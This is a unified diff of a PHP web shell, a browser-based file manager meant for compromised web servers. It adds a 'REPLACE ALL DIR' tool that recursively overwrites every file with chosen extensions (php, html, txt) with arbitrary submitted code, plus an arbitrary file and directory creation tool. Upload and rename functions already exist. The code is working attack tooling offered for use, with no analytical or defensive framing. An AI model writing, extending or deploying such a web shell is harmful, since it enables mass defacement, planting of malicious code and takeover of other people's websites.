@@ -235,6 +235,15 @@
     .topnav .icon {
         display: none;
     }
+    div.alert {
+        background: #508f45;
+        padding:5px;
+        border-radius:3px;
+    }
+    span.value {
+        font-size:22px;
+        padding:15px;
+    }
     @media (min-width: 320px) and (max-width: 480px) {
         body {
             font-size:5px;
@@ -318,6 +327,22 @@
             x.className = "topnav";
         }
     }
+    function checkAll(ele) {
+        var checkboxes = document.getElementsByTagName('input');
+        if (ele.checked) {
+            for (var i = 0; i < checkboxes.length; i++) {
+                if (checkboxes[i].type == 'checkbox' ) {
+                    checkboxes[i].checked = true;
+                }
+            }
+        } else {
+            for (var i = 0; i < checkboxes.length; i++) {
+                if (checkboxes[i].type == 'checkbox') {
+                    checkboxes[i].checked = false;
+                }
+            }
+        }
+    }
 </script>
 
 <table align="center">
@@ -341,12 +366,15 @@ class x {
         $this->cwd  = $this->cwd() . DIRECTORY_SEPARATOR;
         $this->cft  = time();
     }
+    public function redirect($x) {
+        return "<script>window.location='{$x}'</script>";
+    }
     public function home() {
         $this->home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
         if ($this->vars($this->home)) {
             return false;
         } else {
-            $this->vars("<script>window.location='". $this->home ."'</script>");
+            return false;
         }
     }
     public function vars($x) {
@@ -436,6 +464,46 @@ class x {
             }
         }
     }
+    public function listfile($dir, &$output = array()) {
+        foreach (scandir($dir) as $key => $value) {
+            $this->locate = $dir . DIRECTORY_SEPARATOR . $value;
+            if (!is_dir($this->locate)) {
+                $output[] = $this->locate;
+            } elseif ($value != '.' && $value != '..') {
+                $this->listfile($this->locate, $output);
+            }
+        } return $output;
+    } public function replace($dir, $extension, $text) {
+        if (is_writable($dir)) {
+            foreach ($this->listfile($dir) as $key => $value) {
+                $this->ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
+                switch ($this->ext) {
+                    case $extension:
+                        if (preg_match('/' . basename($value) ."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
+                            if (file_put_contents($value, $text)) { ?>
+                                <tr>
+                                    <td>
+                                        <div class="alert">
+                                            <?= $value ?>
+                                        </div>
+                                    </td>
+                                </tr>
+                            <?php }
+                        }
+                        break;
+                }
+            }
+        }
+    }
+    public function makefile($filename, $text, $name = null) {
+        if ($name === 'file') {
+            $this->handle = fopen($filename, "w");
+            fwrite($this->handle, $text);
+            fclose($this->handle);
+        } elseif ($name === 'dir') {
+            return (!mkdir($filename, 0777) && !is_dir($filename));
+        }
+    }
     public function size($filename) {
         if (is_file($filename)) {
             $this->filepath = $filename;
@@ -482,6 +550,117 @@ if (isset($_GET['cd'])) {
 }
 
 switch (@$_POST['tools']) {
+    case 'replace':
+        ?>
+        <tr>
+            <td class="header">
+                <a style="float: left;" href="?cd=<?= getcwd() ?>">
+                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
+                </a>
+                REPLACE ALL DIR
+            </td>
+        </tr>
+        <form method="post">
+            <tr>
+                <td>
+                    <input type="text" name="dir" value="<?= getcwd() ?>">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="text" name="ext[]" placeholder="ext: php html txt">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <textarea name="text" placeholder="your code"><?= htmlspecialchars(@$_POST['text']) ?></textarea>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="submit" name="submit" value="REPLACE">
+                    <input type="hidden" name="tools" value="replace">
+                </td>
+            </tr>
+        </form>
+        <?php
+        if (isset($_POST['submit'])) {
+            for ($i=0; $i < count($_POST['ext']) ; $i++) { 
+                $plod =explode(' ', $_POST['ext'][$i]);
+                foreach ($plod as $key => $value) {
+                    if ($value) { ?>
+                        <tr>
+                            <td>
+                                <center>
+                                    <span class="value"><b><?= $value ?></b></span>
+                                </center>
+                            </td>
+                        </tr>
+                    <?php
+                    $x->replace($_POST['dir'], $value, $_POST['text']);
+                    }
+                }
+            }
+        }
+        exit();
+        break;
+    case 'making':
+        if (isset($_POST['submit'])) {
+            switch ($_POST['type']) {
+                case 'file':
+                    if ($x->makefile($_POST['filename'], $_POST['text'], 'file')) {
+                        ?> <script>alert("failed")</script> <?php
+                    } else {
+                        ?> <script>alert("created file <u><?= $_POST['filename'] ?></u>")</script> <?php
+                    }
+                    break;
+                case 'dir':
+                    if ($x->makefile($_POST['filename'], '', 'dir')) {
+                        ?> <script>alert("failed")</script> <?php
+                    } else {
+                        ?> <script>alert("created dir <u><?= $_POST['filename'] ?></u>")</script> <?php
+                    }
+                    break;
+            }
+        }
+        ?>
+        <tr>
+            <td class="header">
+                <a style="float: left;" href="?cd=<?= getcwd() ?>">
+                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
+                </a>
+                CREATE FILE & DIRECTORY
+            </td>
+        </tr>
+        <form method="post">
+            <tr>
+                <td>
+                    <center>
+                        <input type="radio" name="type" value="file"> FILE 
+                        <input type="radio" name="type" value="dir"> DIR
+                    </center>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="text" name="filename" placeholder="file/dir">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <textarea name="text" placeholder="if you choose dir please clear this"></textarea>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="submit" name="submit">
+                    <input type="hidden" name="tools" value="making">
+                </td>
+            </tr>
+         </form>
+        <?php
+        exit();
+        break;
     case 'upload':
         if (isset($_POST['submit'])) {
             if ($x->upload($_FILES['file'])) {
@@ -680,8 +859,8 @@ switch (@$_POST['act']) {
         break;
     case 'changename':
         if (isset($_POST['submit'])) {
-            if ($x->changename($_POST['file'], $_POST['newname'])) {
-                ?> <script>alert("success change name")</script> <?php
+            if ($x->changename($_POST['file'], htmlspecialchars($_POST['newname']))) {
+                echo ' <meta http-equiv="refresh" content="0;url=?cd='.getcwd().'">';
             } else {
                 ?> <script>alert("failed")</script> <?php
             }
@@ -787,10 +966,10 @@ foreach (scandir(getcwd()) as $key => $value) {
                                 <button name="tools" value="upload">UPLOAD</button>
                             </a>
                             <a>
-                                <button>CREATE FILE</button>
+                                <button name="tools" value="making">CREATE FILE</button>
                             </a>
                             <a>
-                                <button>REPLACE</button>
+                                <button name="tools" value="replace">REPLACE</button>
                             </a>
                             <a>
                                 <button>LOGOUT</button>
@@ -828,7 +1007,7 @@ foreach (scandir(getcwd()) as $key => $value) {
                         <?= $x->w__($value, $x->perms($value)) ?>
                     </center>
                 </td>
-                <form method="post">
+                <form method="post" action="?cd=<?= getcwd() ?>">
                     <td class="select">
                         <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
                             <option selected>ACTION</option>
@@ -856,7 +1035,9 @@ foreach (scandir(getcwd()) as $key => $value) {
                 <img class="icons" src="<?= $x->getimg($value) ?>">
             </td>
             <td class="files">
-                <?= $value ?>
+                <a href="http://<?= $x->server.str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().DIRECTORY_SEPARATOR.$value) ?>" target="_blank">
+                    <?= $value ?>
+                </a>
             </td>
             <td class="size">
                 <center>
@@ -868,7 +1049,7 @@ foreach (scandir(getcwd()) as $key => $value) {
                     <?= $x->w__($value, $x->perms($value)) ?>
                 </center>
             </td>
-            <form method="post">
+            <form method="post" action="?cd=<?= getcwd() ?>">
                 <td class="select">
                     <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
                         <option selected>ACTION</option>
@@ -910,22 +1091,4 @@ if (!empty($data = @$_POST['value'])) {
     }
 }
 ?>
-<script type="text/javascript">
-    function checkAll(ele) {
-        var checkboxes = document.getElementsByTagName('input');
-        if (ele.checked) {
-            for (var i = 0; i < checkboxes.length; i++) {
-                if (checkboxes[i].type == 'checkbox' ) {
-                    checkboxes[i].checked = true;
-                }
-            }
-        } else {
-            for (var i = 0; i < checkboxes.length; i++) {
-                if (checkboxes[i].type == 'checkbox') {
-                    checkboxes[i].checked = false;
-                }
-            }
-        }
-    }
-</script>
 </table>
